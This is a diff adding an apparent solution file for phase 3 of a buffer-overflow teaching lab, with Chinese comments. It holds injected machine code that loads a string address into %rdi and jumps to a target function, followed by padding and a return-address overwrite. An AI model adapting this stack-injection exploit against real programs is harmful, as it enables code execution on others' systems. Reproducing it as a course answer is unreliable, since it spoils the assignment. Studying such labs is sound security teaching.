@@ -1,0 +1,12 @@
+/* question3: */
+35 39 62 39 39 37 66 61 00 /* 9 bytes */
+48 83 c4 09                 /* rsp=rsp+9 */
+48 c7 c7 78 dc 61 55 /* mov $0x5561dc78,%rdi 设置$rdi指向string内存地址 */
+68 fa 18 40 00       /* pushq  $0x4018fa     push touch3的地址 */
+c3                   /* ret                  返回 */
+/* 上面一共26个字节, buf一共40个字节所以需要填充 40-26=14个字节 */
+00 00 00 00 00 00 00 00 /* 8 bytes */
+00 00 00 00 00 00       /* 6 bytes */
+81 dc 61 55 00 00 00 00 /* exploit string code 的开始地址（即get buf的栈地地址) */
+
+
